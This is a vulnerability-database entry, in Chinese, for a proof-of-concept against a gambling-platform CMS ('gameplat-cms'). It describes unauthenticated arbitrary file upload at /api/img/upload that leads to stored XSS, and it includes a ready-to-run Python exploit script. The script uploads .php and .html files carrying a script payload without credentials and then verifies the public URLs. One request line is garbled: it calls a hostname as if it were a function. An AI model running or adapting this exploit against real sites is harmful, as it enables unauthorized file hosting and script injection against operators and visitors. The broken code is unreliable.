# gameplat-cms /api/img/upload 未授权任意文件上传（Content-Type 可控 → 存储型 XSS）

- **code**: gameplat-cms-api-img-upload-未授权任意文件上传-content-type-可控-存储型-xss
- **kind**: poc
- **category**: file-upload
- **component**: gameplat-cms / CN7 模板（博彩游戏平台 CMS）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.25（https://203.0.113.25/api/img/upload）实测：无 Cookie/Token 上传成功，.php 提交 Content-Type: text/html 后回访 https://target176.example.com/202610/9738d5f1-6324-4442-8b65-0efa662d1979.php 返回 200 text/html 且内容为 <script>document.title=1</script>；.jsp/.svg/.html/.txt/无后缀均接受；/api/file/upload 同形态返回 401。无需认证。
- **path**: pocs/gameplat-cms-api-img-upload-未授权任意文件上传-content-type-可控-存储型-xss/poc_unauth_upload.py
- **tags**: 未授权,文件上传,对象存储,存储型XSS,博彩CMS
- **created_at**: 2026-10-05T14:11:12.964Z
- **found_by**: vuln-scan

## 描述

gameplat-cms（CN7 模板）的 /api/img/upload 未授权任意文件上传：无鉴权、无后缀/类型校验，落对象存储 CDN 公网可读，Content-Type 回显提交值（提交 text/html 即存储型 XSS）。判定：POST 返回 code=0 + data 为公网 URL；对照 /api/file/upload 为 401。

## 用法

```
python poc_unauth_upload.py https://TARGET
替换点：TARGET = 站点根 URL（同平台任意入口域名均可）。无需任何凭据。
成功判据：响应 {"code":0,"data":"https://img.<CDN>/<yyyymm>/<uuid>.<ext>","succeed":true}，且回访该 URL 返回 200 + 我们提交的 Content-Type 与原文。
```

## 正文

```
#!/usr/bin/env python3
# 未授权任意文件上传 POC（gameplat-cms /api/img/upload）
# 用法: python poc_unauth_upload.py https://TARGET
import sys, requests, urllib3
urllib3.disable_warnings()
base = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'https://TARGET'
S = requests.Session(); S.verify = False
H = {'User-Agent': 'Mozilla/5.0 Chrome/126', 'x-request-source': base,
     'Origin': base, 'Referer': base + '/login'}
# 1) 无任何 Cookie/Token 直接上传
for fn, body, ct in [('t.png', b'\x89PNG\r\n\x1a\n', 'image/png'),
                     ('poc.php', b'<script>document.title=1</script>', 'text/html'),
                     ('poc.html', b'<h1>x</h1>', 'text/html')]:
    r = target8.example.com(base + '/api/img/upload', files={'file': (fn, body, ct)}, headers=H, timeout=25)
    print(fn, '->', r.status_code, r.text[:200])
    try:
        u = r.json().get('data')
    except Exception:
        u = None
    if u:
        v = requests.get(u, timeout=20, verify=False, headers={'User-Agent': 'Mozilla/5.0 Chrome/126'})
        print('   verify:', v.status_code, v.headers.get('content-type'), v.content[:80])
# 判据: code=0 且返回公网 URL、后缀与 Content-Type 均未校验 => 未授权任意文件上传
# 对照: /api/file/upload 同形态返回 401（说明是该接口单独缺鉴权）

```
